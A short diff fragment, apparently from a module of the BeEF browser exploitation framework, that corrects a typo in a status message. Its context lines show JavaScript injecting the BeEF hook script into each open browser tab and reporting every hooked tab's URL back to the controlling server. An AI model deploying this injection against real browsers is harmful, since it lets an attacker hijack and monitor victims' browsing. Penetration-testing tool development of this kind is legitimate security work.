@@ -15,7 +15,7 @@ beef.execute(function() {
                                     + beefHookUri + "'; newScript.setAttribute('onload','beef_init()'); document.getElementsByTagName('head')[0].appendChild(newScript);"})
 
 						        //send back the new domain that will be hooked :-)
-                                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Succesfully injected BeEF hook on: ' + tabs[t].url);
+                                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Successfully injected BeEF hook on: ' + tabs[t].url);
                             }
 						}
 					})
